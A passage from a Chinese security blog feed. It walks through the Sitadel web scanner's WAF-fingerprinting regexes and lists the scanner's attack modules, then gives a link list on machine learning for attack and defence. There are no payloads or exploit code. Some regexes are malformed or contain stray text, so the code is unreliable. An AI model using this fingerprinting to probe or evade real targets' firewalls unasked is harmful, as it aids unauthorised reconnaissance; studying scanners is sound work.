re.search(r&#39;barra_counter_session=&#39;, item[1], re.I) is not None            #匹配headers中value值是否有barracuda_            _ |= re.search(r&#39;barracuda_&#39;, item[1], re.I) is not None            if _:                return &quot;Barracuda Web Application Firewall (Barracuda Networks)&quot;</code></pre><h4 id="bigip"><a href="#bigip" class="headerlink" title="bigip"></a>bigip</h4><p>原理：主要依靠header特别字段的正则匹配</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190226100504.png" alt=""></p><pre><code class="python">class Bigip(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有BigIP或BIGipServer            _ = re.search(r&#39;BigIP|BIGipServer&#39;, item[1], re.I) is not None            #匹配headers中value值是否有TS+至少匹配4次+=            _ |= re.search(r&#39;TS\w{4,}=&#39;, item[1], re.I) is not None            #匹配headers中value值是否有F5            _ |= re.search(r&#39;F5&#39;, item[1], re.I) is not None            if _:                return &quot;BIG-IP Application Security Manager (F5 Networks)&quot;</code></pre><h4 id="binarysec"><a href="#binarysec" class="headerlink" title="binarysec"></a>binarysec</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Binarysec(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有BinarySec            _ = re.search(r&#39;BinarySec&#39;, item[1], re.I) is not None            #匹配headers中key值是否有x-binarysec-via或x-binarysec-nocahe            _ |= re.search(r&#39;x-binarysec-[via|nocahe]&#39;, item[0], re.I) is not None            if _:                return &quot;BinarySEC Web Application Firewall (BinarySEC)&quot;</code></pre><h4 id="blockdos"><a href="#blockdos" class="headerlink" title="blockdos"></a>blockdos</h4><p>原理：主要依靠header特别字段的正则匹配</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/20190226101853.png" alt=""></p><pre><code class="python">class Blockdos(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有BlockDos[\.net]*            _ = re.search(r&#39;BlockDos[\.net]*&#39;, item[1], re.I) is not None            if _:                return &quot;BlockDoS&quot;</code></pre><h4 id="chinacache"><a href="#chinacache" class="headerlink" title="chinacache"></a>chinacache</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Chinacache(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中key值是否有Powered-By-ChinaCache            _ = re.search(r&#39;Powered-By-ChinaCache&#39;, item[0], re.I) is not None            if _:                return &quot;ChinaCache-CDN&quot;</code></pre><h4 id="ciscoacexml"><a href="#ciscoacexml" class="headerlink" title="ciscoacexml"></a>ciscoacexml</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Ciscoacexml(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有ACE XML Gateway            _ = re.search(r&#39;ACE XML Gateway&#39;, item[1], re.I) is not None            if _:                return &quot;Cisco ACE XML Gateway (Cisco Systems)&quot;</code></pre><h4 id="cloudflare"><a href="#cloudflare" class="headerlink" title="cloudflare"></a>cloudflare</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Cloudflare(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有cloudflare[-nginx]            _ = re.search(r&#39;cloudflare[-nginx]&#39;, item[1], re.I) is not None            #匹配headers中value值是否有__cfduid=            _ |= re.search(r&#39;__cfduid=&#39;, item[1], re.I) is not None            #匹配headers中key值是否有cf-ray            _ |= re.search(r&#39;cf-ray&#39;, item[0], re.I) is not None            if _:                return &quot;CloudFlare Web Application Firewall (CloudFlare)&quot;</code></pre><h4 id="cloudfront"><a href="#cloudfront" class="headerlink" title="cloudfront"></a>cloudfront</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Cloudfront(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有(cloudfront)            _ = re.search(r&#39;(cloudfront)&#39;, item[1], re.I) is not None            #匹配headers中key值是否有x-amz-cf-id            _ |= re.search(&#39;x-amz-cf-id&#39;, item[0], re.I) is not None            if _:                return &quot;CloudFront Web Application Firewall (Amazon)&quot;</code></pre><h4 id="dotdefender"><a href="#dotdefender" class="headerlink" title="dotdefender"></a>dotdefender</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Dotdefender(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中key值是否有X-dotDefender-denied            _ = re.search(r&#39;X-dotDefender-denied&#39;, item[0], re.I) is not None            if _:                return &quot;dotDefender Web Application Firewall (Applicure Technologies)&quot;</code></pre><h4 id="edgecast"><a href="#edgecast" class="headerlink" title="edgecast"></a>edgecast</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Edgecast(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有ECDF            _ = re.search(r&#39;ECDF&#39;, item[1], re.I) is not None            if _:                return &quot;EdgeCast Web Application Firewall (Verizon)&quot;</code></pre><h4 id="fortiweb"><a href="#fortiweb" class="headerlink" title="fortiweb"></a>fortiweb</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Fortiweb(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有FORTIWAFSID=            _ = re.search(r&#39;FORTIWAFSID=&#39;, item[1], re.I) is not None            if _:                return &quot;FortiWeb Web Application Firewall (Fortinet)&quot;</code></pre><h4 id="hyperguard"><a href="#hyperguard" class="headerlink" title="hyperguard"></a>hyperguard</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Hyperguard(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有 开始位置+WODSESSION=            _ = re.search(r&#39;^WODSESSION=&#39;, item[1], re.I) is not None            if _:                return &quot;Hyperguard Web Application Firewall (art of defence)&quot;</code></pre><h4 id="incapsula"><a href="#incapsula" class="headerlink" title="incapsula"></a>incapsula</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Incapsula(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有 incap_ses或visid_incap或Incapsula            _ = re.search(r&#39;incap_ses|visid_incap|Incapsula&#39;, item[1], re.I) is not None            if _:                return &quot;Incapsula Web Application Firewall (Incapsula/Imperva)&quot;</code></pre><h4 id="isaserver"><a href="#isaserver" class="headerlink" title="isaserver"></a>isaserver</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Isaserver(FingerprintPlugin):    def process(self, headers, content):        try:            _ = False            #匹配content中是否有The server denied the specified Uniform Resource Locator (URL). Contact the server administrator.            _ = re.search(                r&#39;The server denied the specified Uniform Resource Locator (URL). Contact the server administrator.&#39;,                content, re.I) is not None            #匹配content中是否有The ISA Server denied the specified Uniform Resource Locator (URL)            _ |= re.search(r&#39;The ISA Server denied the specified Uniform Resource Locator (URL)&#39;, content,                           re.I) is not None            if _:                return &quot;ISA Server (Microsoft)&quot;        #若未检测到则抛出异常        except Exception as e:            print(&quot;IsaServer Problem &quot;, e)</code></pre><h4 id="kona"><a href="#kona" class="headerlink" title="kona"></a>kona</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Kona(FingerprintPlugin):    def process(self, headers, content):        _ = False       for item in headers.items():            #匹配headers中value值是否有AkamaiGHost或Kona            _ = re.search(r&#39;AkamaiGHost|Kona&#39;, item[1], re.I) is not None            if _:                return &quot;Kona Web Application Firewall (Akamai)&quot;</code></pre><h4 id="modsecurity"><a href="#modsecurity" class="headerlink" title="modsecurity"></a>modsecurity</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Modsecurity(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有d_Security或NOYB            _ = re.search(r&#39;Mod_Security|NOYB&#39;, item[1], re.I) is not None            if _:                return &quot;ModSecurity Web Application Firewall (Trustwave)&quot;</code></pre><h4 id="netcontinuum"><a href="#netcontinuum" class="headerlink" title="netcontinuum"></a>netcontinuum</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Netcontinuum(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有NCI__SessionId=            _ = re.search(r&#39;NCI__SessionId=&#39;, item[1], re.I) is not None            if _:                return &quot;NetContinuum Web Application Firewall (NetContinuum/Barracuda Networks)&quot;</code></pre><h4 id="paloalt"><a href="#paloalt" class="headerlink" title="paloalt"></a>paloalt</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Paloalto(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有MISS from PaloAlto            _ = re.search(r&#39;MISS from PaloAlto&#39;, item[1], re.I) is not None            if _:                return &quot;Palo Alto Firewall (Palo Alto Networks)&quot;</code></pre><h4 id="profense"><a href="#profense" class="headerlink" title="profense"></a>profense</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Profense(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有PLBSID=            _ = re.search(r&#39;PLBSID=&#39;, item[1], re.I) is not None            #匹配headers中value值是否有Profense            _ = re.search(r&#39;Profense&#39;, item[1], re.I) is not None            if _:                return &quot;Profense Web Application Firewall (Armorlogic)&quot;</code></pre><h4 id="radware"><a href="#radware" class="headerlink" title="radware"></a>radware</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Radware(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有X-SL-CompState            _ = re.search(r&#39;X-SL-CompState&#39;, item[0], re.I) is not None            if _:                return &quot;AppWall Web Application Firewall (Radware)&quot;</code></pre><h4 id="requestvalidationmode"><a href="#requestvalidationmode" class="headerlink" title="requestvalidationmode"></a>requestvalidationmode</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Requestvalidationmode(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有ASP.NET has detected data in the request that is potentially dangerous        _ = re.search(r&#39;ASP.NET has detected data in the request that is potentially dangerous&#39;, content,                      re.I) is not NoneRequest Validation has detected a potentially dangerous client input value        #匹配content中是否有Request Validation has detected a potentially dangerous client input value        _ |= re.search(r&#39;Request Validation has detected a potentially dangerous client input value&#39;, content,                       re.I) is not None        if _:            return &quot;ASP.NET RequestValidationMode (Microsoft)&quot;</code></pre><h4 id="safedog"><a href="#safedog" class="headerlink" title="safedog"></a>safedog</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Safedog(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有WAF/2.0            _ = re.search(r&#39;WAF/2\.0&#39;, item[1], re.I) is not None            #匹配headers中value值是否有Safedog            _ |= re.search(r&#39;Safedog&#39;, item[1], re.I) is not None            if _:                return &quot;Safedog Web Application Firewall (Safedog)&quot;</code></pre><h4 id="secureiis"><a href="#secureiis" class="headerlink" title="secureiis"></a>secureiis</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Secureiis(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有SecureIIS+开始字符&lt;+Web Server Protection        _ = re.search(r&#39;SecureIIS[^&lt;]+Web Server Protection&#39;, content, re.I) is not None        #匹配content中是否有http://www.eeye.com/SecureIIS/        _ |= re.search(r&#39;http://www.eeye.com/SecureIIS/&#39;, content, re.I) is not None        #匹配content中是否有?subject=[^&gt;]*SecureIIS Error        _ |= re.search(r&#39;\?subject=[^&gt;]*SecureIIS Error&#39;, content, re.I) is not None        if _:            return &quot;SecureIIS Web Server Security (BeyondTrust&quot;</code></pre><h4 id="sengnix"><a href="#sengnix" class="headerlink" title="sengnix"></a>sengnix</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Senginx(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有SENGINX-ROBOT-MITIGATION        _ = re.search(r&#39;SENGINX-ROBOT-MITIGATION&#39;, content, re.I) is not None        if _:            return &quot;SEnginx (Neusoft Corporation)&quot;</code></pre><h4 id="sitelock"><a href="#sitelock" class="headerlink" title="sitelock"></a>sitelock</h4><p>原理：主要依靠content特别字段的正则匹配</p><pre><code class="python">class Sitelock(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有SiteLock Incident ID        _ = re.search(r&#39;SiteLock Incident ID&#39;, content, re.I) is not None        if _:            return &quot;TrueShield Web Application Firewall (SiteLock)&quot;</code></pre><h4 id="sonicwall"><a href="#sonicwall" class="headerlink" title="sonicwall"></a>sonicwall</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Sonicwall(FingerprintPlugin):    def process(self, headers, content):        _ = False        #匹配content中是否有This request is blocked by the SonicWALL        _ = re.search(r&#39;This request is blocked by the SonicWALL&#39;, content, re.I) is not None        #匹配content中是否有Web Site Blocked.+\bnsa_banner      \b匹配一个单词边界        _ |= re.search(r&#39;Web Site Blocked.+\bnsa_banner&#39;, content, re.I) is not None        if _:            return &quot;SonicWALL (Dell)&quot;</code></pre><h4 id="sucuri"><a href="#sucuri" class="headerlink" title="sucuri"></a>sucuri</h4><p> 原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Sucuri(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有Sucuri或Cloudproxy            _ = re.search(r&#39;Sucuri|Cloudproxy&#39;, item[1], re.I) is not None            #匹配headers中key值是否有X-Sucuri-ID            _ |= re.search(r&#39;X-Sucuri-ID&#39;, item[0], re.I) is not None            if _:                return &quot;CloudProxy WebSite Firewall (Sucuri)&quot;</code></pre><h4 id="trafficshield"><a href="#trafficshield" class="headerlink" title="trafficshield"></a>trafficshield</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Trafficshield(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有F5-TrafficShield            _ = re.search(r&#39;F5-TrafficShield&#39;, item[1], re.I) is not None            #或匹配到headers中value值是否有ASINFO=            _ |= re.search(r&#39;ASINFO=&#39;, item[1], re.I) is not None            if _:                return &quot;TrafficShield (F5 Networks)&quot;</code></pre><h4 id="varnish"><a href="#varnish" class="headerlink" title="varnish"></a>varnish</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Varnish(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中key值是否有X-Varnish            _ = re.search(r&#39;X-Varnish&#39;, item[0], re.I) is not None            #匹配headers中value值是否有varnish*            _ |= re.search(r&#39;varnish*&#39;, item[1], re.I) is not None            if _:                return &quot;Varnish FireWall (OWASP)&quot;</code></pre><h4 id="wallarm"><a href="#wallarm" class="headerlink" title="wallarm"></a>wallarm</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Wallarm(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有nginx-wallarm            _ = re.search(r&#39;nginx-wallarm&#39;, item[1], re.I) is not None            if _:                return &quot;Wallarm Web Application Firewall (Wallarm)&quot;</code></pre><h4 id="webknight"><a href="#webknight" class="headerlink" title="webknight"></a>webknight</h4><p>原理：主要依靠header特别字段的正则匹配</p><pre><code class="python">class Webknight(FingerprintPlugin):    def process(self, headers, content):        _ = False        for item in headers.items():            #匹配headers中value值是否有Webknight            _ = re.search(r&#39;Webknight&#39;, item[1], re.I) is not None            if _:                return &quot;WebKnight Application Firewall (AQTRONIX)&quot;</code></pre><h2 id="0x08-lib-modules-attacks"><a href="#0x08-lib-modules-attacks" class="headerlink" title="0x08  lib/modules/attacks"></a>0x08  lib/modules/attacks</h2><p>主要的攻击模块</p><pre><code>│   │   ├── attacks│   │   │   ├── bruteforce│   │   │   │   ├── admin.py│   │   │   │   ├── backdoor.py│   │   │   │   ├── bdir.py│   │   │   │   ├── bfile.py│   │   │   │   ├── dir.py│   │   │   │   ├── file.py│   │   │   │   ├── __init__.py│   │   │   │   └── log.py│   │   │   ├── __init__.py│   │   │   ├── injection│   │   │   │   ├── html.py│   │   │   │   ├── __init__.py│   │   │   │   ├── ldap.py│   │   │   │   ├── php.py│   │   │   │   ├── rfi.py│   │   │   │   ├── sql.py│   │   │   │   ├── xpath.py│   │   │   │   └── xss.py│   │   │   ├── other│   │   │   │   ├── allow_method.py│   │   │   │   ├── dav.py│   │   │   │   ├── htmlobject.py│   │   │   │   ├── __init__.py│   │   │   │   ├── listing.py│   │   │   │   ├── multipleindex.py│   │   │   │   ├── phpinfo.py│   │   │   │   ├── robots.py│   │   │   │   └── xst.py│   │   │   └── vulns│   │   │       ├── anonymous.py│   │   │       ├── crime.py│   │   │       ├── __init__.py│   │   │       ├── shellshock.py│   │   │       └── strutsshock.py</code></pre><h3 id="bruteforce"><a href="#bruteforce" class="headerlink" title="bruteforce"></a>bruteforce</h3><h4 id="admin-py"><a href="#admin-py" class="headerlink" title="admin.py"></a>admin.py</h4><p>代更</p><h4 id="backdoor-py"><a href="#backdoor-py" class="headerlink" title="backdoor.py"></a>backdoor.py</h4><h4 id="bdir-py"><a href="#bdir-py" class="headerlink" title="bdir.py"></a>bdir.py</h4><h4 id="bfile-py"><a href="#bfile-py" class="headerlink" title="bfile.py"></a>bfile.py</h4><h4 id="dir-py"><a href="#dir-py" class="headerlink" title="dir.py"></a>dir.py</h4><h4 id="file-py"><a href="#file-py" class="headerlink" title="file.py"></a>file.py</h4><h4 id="init-py-2"><a href="#init-py-2" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h4 id="log-py"><a href="#log-py" class="headerlink" title="log.py"></a>log.py</h4><h4 id="init-py-3"><a href="#init-py-3" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>注入类的漏洞检测</p><h4 id="html-py"><a href="#html-py" class="headerlink" title="html.py"></a>html.py</h4><p>检查HTML代码注入。思路即：在参数值中添加进html代码，然后检查返回的响应，直接用<code>search(payload,resq.text)</code> 来看能否检测到相应的模式，。若存在则保存<code>URL</code>、<code>DATA</code>、<code>PAYLOAD</code>,然后输出。</p><h4 id="init-py-4"><a href="#init-py-4" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h4 id="ldap-py"><a href="#ldap-py" class="headerlink" title="ldap.py"></a>ldap.py</h4><h4 id="php-py"><a href="#php-py" class="headerlink" title="php.py"></a>php.py</h4><h4 id="rfi-py"><a href="#rfi-py" class="headerlink" title="rfi.py"></a>rfi.py</h4><h4 id="sql-py"><a href="#sql-py" class="headerlink" title="sql.py"></a>sql.py</h4><h4 id="xpath-py"><a href="#xpath-py" class="headerlink" title="xpath.py"></a>xpath.py</h4><h4 id="xss-py"><a href="#xss-py" class="headerlink" title="xss.py"></a>xss.py</h4><h3 id="other"><a href="#other" class="headerlink" title="other"></a>other</h3><h4 id="allow-method-py"><a href="#allow-method-py" class="headerlink" title="allow_method.py"></a>allow_method.py</h4><h4 id="dav-py"><a href="#dav-py" class="headerlink" title="dav.py"></a>dav.py</h4><h4 id="htmlobject-py"><a href="#htmlobject-py" class="headerlink" title="htmlobject.py"></a>htmlobject.py</h4><h4 id="init-py-5"><a href="#init-py-5" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h4 id="listing-py"><a href="#listing-py" class="headerlink" title="listing.py"></a>listing.py</h4><h4 id="multipleindex-py"><a href="#multipleindex-py" class="headerlink" title="multipleindex.py"></a>multipleindex.py</h4><h4 id="phpinfo-py"><a href="#phpinfo-py" class="headerlink" title="phpinfo.py"></a>phpinfo.py</h4><h4 id="robots-py"><a href="#robots-py" class="headerlink" title="robots.py"></a>robots.py</h4><h4 id="xst-py"><a href="#xst-py" class="headerlink" title="xst.py"></a>xst.py</h4><h3 id="vulns"><a href="#vulns" class="headerlink" title="vulns"></a>vulns</h3><h4 id="anonymous-py"><a href="#anonymous-py" class="headerlink" title="anonymous.py"></a>anonymous.py</h4><h4 id="crime-py"><a href="#crime-py" class="headerlink" title="crime.py"></a>crime.py</h4><h4 id="init-py-6"><a href="#init-py-6" class="headerlink" title="init.py"></a><strong>init</strong>.py</h4><h4 id="shellshock-py"><a href="#shellshock-py" class="headerlink" title="shellshock.py"></a>shellshock.py</h4><h4 id="strutsshock-py"><a href="#strutsshock-py" class="headerlink" title="strutsshock.py"></a>strutsshock.py</h4>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Sitadel源码阅读&quot;&gt;&lt;a href=&quot;#Sitadel源码阅读&quot; class=&quot;headerlink&quot; title=&quot;Sitadel源码阅读&quot;&gt;&lt;/a&gt;Sitadel源码阅读&lt;/h1&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/s
      
    
    </summary>
    
      <category term="源码阅读" scheme="http://Bigbroke.com/categories/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    
    
      <category term="ctf" scheme="http://Bigbroke.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>AI-Security-Learning</title>
    <link href="http://Bigbroke.com/archis/eed6fa1/"/>
    <id>http://Bigbroke.com/archis/eed6fa1/</id>
    <published>2019-02-17T13:15:30.000Z</published>
    <updated>2019-03-14T15:58:21.706Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AI-Security-Learning"><a href="#AI-Security-Learning" class="headerlink" title="AI-Security-Learning"></a>AI-Security-Learning</h1><p>自身学习的安全数据科学和ai安全算法的学习资料</p><p>项目地址： <a href="https://github.com/bigbroke/AI-Security-Learning" target="_blank" rel="external">https://github.com/bigbroke/AI-Security-Learning</a></p><p>最近更新日期为：2019/02/17</p><p>同步更新于： <a href="http://Bigbroke.com/archis/eed6fa1/">Bigbroke: AI-Security-Learning</a></p><p>[TOC]</p><h2 id="机器学习与安全课程"><a href="#机器学习与安全课程" class="headerlink" title="机器学习与安全课程"></a>机器学习与安全课程</h2><ul><li><a href="http://web.stanford.edu/class/cs259d/" target="_blank" rel="external">斯坦福CS259D</a></li><li><a href="https://github.com/albahnsen/ML_SecurityInformatics" target="_blank" rel="external">短期课程 - 安全信息学应用机器学习</a></li><li><a href="https://github.com/cylance/IntroductionToMachineLearningForSecurityPros" target="_blank" rel="external">我们的书“安全专业人工智能简介”的示例代码</a></li></ul><h2 id="AI应用攻击篇"><a href="#AI应用攻击篇" class="headerlink" title="AI应用攻击篇"></a>AI应用攻击篇</h2><p>用AI来做应用安全攻击</p><h3 id="自动化渗透"><a href="#自动化渗透" class="headerlink" title="自动化渗透"></a>自动化渗透</h3><ul><li><a href="https://securityonline.info/deep-exploit/" target="_blank" rel="external">Deep Exploit：使用机器学习的全自动渗透测试工具</a></li><li><a href="https://github.com/gyoisamurai/GyoiThon" target="_blank" rel="external">GyoiThon：使用机器学习的全自动渗透测试工具</a></li></ul><h3 id="验证码识别"><a href="#验证码识别" class="headerlink" title="验证码识别"></a>验证码识别</h3><ul><li><a href="https://paper.tuisec.win/detail/ccfdadb1b7e3f9e" target="_blank" rel="external">机器学习之识别简单验证码</a></li></ul><h3 id="自动化鱼叉式钓鱼攻击"><a href="#自动化鱼叉式钓鱼攻击" class="headerlink" title="自动化鱼叉式钓鱼攻击"></a>自动化鱼叉式钓鱼攻击</h3><ul><li><a href="https://www.freebuf.com/articles/web/132811.html" target="_blank" rel="external">一种基于机器学习的自动化鱼叉式网络钓鱼思路</a></li><li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Seymour-Tully-Weaponizing-Data-Science-For-Social-Engineering-Automated-E2E-Spear-Phishing-On-Twitter-wp.pdf" target="_blank" rel="external">Weaponizing data science for social engineering: Automated E2E spear phishing on Twitter</a></li></ul><h3 id="自动化恶意软件样本生成"><a href="#自动化恶意软件样本生成" class="headerlink" title="自动化恶意软件样本生成"></a>自动化恶意软件样本生成</h3><ul><li><a href="https://arxiv.org/abs/1702.05983" target="_blank" rel="external">利用GAN生成对抗恶意软件样本</a></li></ul><h3 id="自动化漏洞挖掘"><a href="#自动化漏洞挖掘" class="headerlink" title="自动化漏洞挖掘"></a>自动化漏洞挖掘</h3><ul><li><a href="https://www.zybuluo.com/qinyun/note/957067" target="_blank" rel="external">AI与Android漏洞挖掘的那些事儿</a></li></ul><h3 id="通过舆情分析和精准广告投放来影响政治事件"><a href="#通过舆情分析和精准广告投放来影响政治事件" class="headerlink" title="通过舆情分析和精准广告投放来影响政治事件"></a>通过舆情分析和精准广告投放来影响政治事件</h3><ul><li><a href="https://www.zuozuovera.com/archives/1565/" target="_blank" rel="external">AI与安全的恩怨情仇五部曲「1」Misuse AI</a></li></ul><h2 id="AI应用防御篇"><a href="#AI应用防御篇" class="headerlink" title="AI应用防御篇"></a>AI应用防御篇</h2><p>用AI来做应用安全防护</p><h3 id="UEBA"><a href="#UEBA" class="headerlink" title="UEBA"></a>UEBA</h3><p><a href="https://ixyzero.com/blog/archives/4103.html" target="_blank" rel="external">UBA/UEBA的资料收集和学习</a></p><p><a href="https://www.secpulse.com/archives/95668.html" target="_blank" rel="external">UEBA架构设计之路1：UEBA框架</a>  </p><p><a href="https://www.secpulse.com/archives/96063.html" target="_blank" rel="external">UEBA架构设计之路2：数据接入和准备</a></p><p><a href="https://www.secpulse.com/archives/96049.html" target="_blank" rel="external">UEBA架构设计之路3：复杂事件处理引擎</a></p><p><a href="https://www.sec-un.org/ueba%E5%A6%82%E4%BD%95%E5%9C%A8%E4%BC%81%E4%B8%9A%E6%9C%89%E6%95%88%E5%9C%B0%E5%BA%94%E7%94%A8%E4%B8%8E%E8%90%BD%E5%9C%B0/" target="_blank" rel="external">UEBA如何在企业有效地应用与落地</a></p><p><a href="https://www.secrss.com/articles/760" target="_blank" rel="external">UEBA在企业安全领域应用的现状和挑战</a></p><p><a href="https://www.freebuf.com/articles/neopoints/131514.html" target="_blank" rel="external">浅析用户行为分析系统（UEBA）</a></p><p><a href="https://www.jianshu.com/p/b7eda54bb1e5" target="_blank" rel="external">机器学习算法在用户行为检测(UBA)领域</a></p><p><a href="https://www.jianshu.com/p/b7eda54bb1e5" target="_blank" rel="external">新一代数据安全的制胜法宝-UBA</a></p><p><a href="http://www.sohu.com/a/160849130_642762" target="_blank" rel="external">干货｜用机器学习检测异常点击流</a></p><p><a href="http://dearcharles.cn/2017/11/11/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95%E5%9C%A8%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B-UBA-%E9%A2%86%E5%9F%9F%E7%9A%84%E5%BA%94%E7%94%A8/" target="_blank" rel="external">机器学习算法在用户行为检测(UBA)领域的应用</a></p><h3 id="Web安全检测"><a href="#Web安全检测" class="headerlink" title="Web安全检测"></a>Web安全检测</h3><h4 id="检测web攻击"><a href="#检测web攻击" class="headerlink" title="检测web攻击"></a>检测web攻击</h4><ul><li><a href="https://aivillage.org/posts/detecting-web-attacks-rnn/" target="_blank" rel="external">用递归神经网络检测WEB攻击</a></li><li><a href="https://iami.xyz/ML-IN-Webshell-Detection-Advantages-And-Disadvantages/" target="_blank" rel="external">Web安全检测中机器学习的经验之谈</a></li></ul><h4 id="Webshell检测"><a href="#Webshell检测" class="headerlink" title="Webshell检测"></a>Webshell检测</h4><ul><li><a href="https://www.s0nnet.com/archives/fshell-feature-1" target="_blank" rel="external">基于机器学习的分布式webshell检测系统-特征工程（1）</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzIwNjEwNTQ4Mw==&amp;mid=2651577090&amp;idx=1&amp;sn=924b14ba842f57c34f06995416a98360&amp;chksm=8cd9c5e6bbae4cf0e3eed6192133c6c87de47cfcc911fca90d86f1383d5ec2f6f1cf661aaeb6&amp;mpshare=1&amp;scene=21&amp;srcid=0118yl2ryPVxJto00p3uvrhy#wechat_redirect" target="_blank" rel="external">兜哥基于机器学习的 Webshell 发现技术探索</a></li><li><a href="https://www.cdxy.me/?p=788" target="_blank" rel="external">深度学习PHP webshell查杀引擎demo</a></li><li><a href="https://github.com/lcatro/WebShell-Detect-By-Machine-Learning" target="_blank" rel="external">使用机器学习识别WebShell</a></li><li><a href="https://github.com/Lingerhk/fshell" target="_blank" rel="external">基于机器学习的分布式Webshell检测系统</a></li><li><a href="https://mp.weixin.qq.com/s/1V0xcjH-6V5qJoJILP0pJQ" target="_blank" rel="external">基于机器学习的Webshell发现技术探索</a></li><li><a href="http://gitbook.cn/books/5964d154cc597d3e0c08667c/index.html" target="_blank" rel="external">刘焱： Webshell 发现技术实战解析</a></li><li><a href="http://www.cnetsec.com/article/22593.html" target="_blank" rel="external">安普诺张涛：再谈webshell检测</a></li><li><a href="https://iami.xyz/New-Begin-For-Nothing/" target="_blank" rel="external">新开始:webshell的检测</a></li><li><a href="https://www.freebuf.com/articles/web/181169.html" target="_blank" rel="external">基于机器学习的WebShell检测方法与实现(上)</a></li><li><a href="https://paper.seebug.org/526/" target="_blank" rel="external">初探机器学习检测PHP Webshell</a></li></ul><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><ul><li><a href="https://www.cdxy.me/?p=773" target="_blank" rel="external">机器学习识别XSS实践</a></li><li><a href="http://webber.tech/posts/%E4%BD%BF%E7%94%A8%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E6%A3%80%E6%B5%8BXSS/" target="_blank" rel="external">使用深度学习检测XSS</a></li><li><a 